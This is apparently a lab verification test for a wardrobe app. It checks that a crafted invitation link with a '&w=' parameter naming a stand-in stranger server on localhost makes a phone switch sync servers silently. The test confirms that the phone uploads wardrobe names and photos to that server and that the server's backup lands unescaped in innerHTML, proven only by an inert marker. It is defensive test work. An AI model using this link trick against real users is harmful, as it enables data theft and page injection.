// W2-13-01: a crafted invitation link (#invite=<any code>&w=<another server>) on a phone that isn't connected connects it to that
// server with no question, uploads the wardrobe there, and the stranger's backup reaches innerHTML unescaped in the app.
// Lab 9730/9731; the stranger is a stand-in on 127.0.0.1:9735. Proof is an inert marker element only (lib-verify13 BREAK).
const RP = require('../harness/paths.js');
const L = require('./lib-verify13.js'), fs = require('fs');
L.run(async () => {
  const lab = await L.startLab('01'); await L.startStranger();
  const JPG = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=';
  const now = Date.parse(L.T0) - 864e5, file = RP.SCRATCH + '/kv/verify13-01-backup.json';
  fs.writeFileSync(file, JSON.stringify({ app: 'daily-wardrobe', version: 1, items: [
    { id: 'v1', type: 'suit', primaryColor: 'navy', pattern: 'solid', secondaryColor: 'none', tertiaryColor: 'none', name: 'V13 navy suit', added: now, updated: now, photo: JPG },
    { id: 'v2', type: 'shirt', primaryColor: 'white', pattern: 'solid', secondaryColor: 'none', tertiaryColor: 'none', name: 'V13 white shirt', added: now, updated: now }], days: [], tombstones: {} }));
  const ph = await L.phone('01');
  await ph.page.goto(lab.appUrl); await ph.ready(); await L.sleep(1200);
  await L.skipSetup(ph);
  await L.restoreFile(ph, file); await L.closeSettingsUI(ph);
  const before = await L.st(ph);
  const link = lab.appUrl + '#invite=' + 'Qq' + 'c'.repeat(30) + '&w=' + encodeURIComponent(L.SURL);
  await ph.page.goto(link); await L.sleep(1000); await ph.page.reload(); await ph.ready();
  let q = ''; for (let i = 0; i < 12; i++) { await L.sleep(500); q = q || await L.askText(ph); }
  await ph.tap('#n-wardrobe').catch(() => {}); await L.sleep(1500);
  const after = await L.st(ph);
  const posts = L.strangerLog.filter(e => e.m === 'POST' && e.path === '/sync');
  const got = after.worker === L.SURL;                 // the phone switched to the stranger with no question
  const uploaded = posts.some(e => e.names.length > 0);  // the wardrobe (with names/photos) was POSTed to the stranger
  const ran = (after.marks || []).includes('from-stranger');  // the stranger's backup reached innerHTML unescaped
  const ok = got && uploaded && !q;
  L.verdict(ok, { questionAsked: q || '(none)', workerBefore: before.worker, workerAfter: after.worker, switchedToStranger: got,
    wardrobeUploadedToStranger: uploaded, strangerSyncPosts: posts.map(e => `${e.bytes}B names=${JSON.stringify(e.names)} photos=${e.photos} img=${e.hasImg}`),
    strangerBackupMarkInPage: ran, allStrangerRequests: L.strangerLog.map(e => `${e.m} ${e.path} tok=${e.tok}`) });
});
